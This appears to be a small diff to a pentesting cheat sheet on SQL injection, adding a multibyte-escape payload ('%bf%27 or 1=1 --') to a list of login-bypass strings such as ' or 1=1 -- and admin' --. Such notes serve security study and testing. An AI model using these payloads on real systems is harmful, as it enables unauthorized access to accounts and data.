@@ -43,7 +43,8 @@ or 1=1 --
 ' or username LIKE '%admin%*
     Payloads, where username is 'admin':
     *' or ( 1=1 and username='admin');
-admin' --*
+admin' --
+%bf%27 or 1=1 --*
 
 MsSqli exploitation
     Find injectable parameter, doing do boolean based:
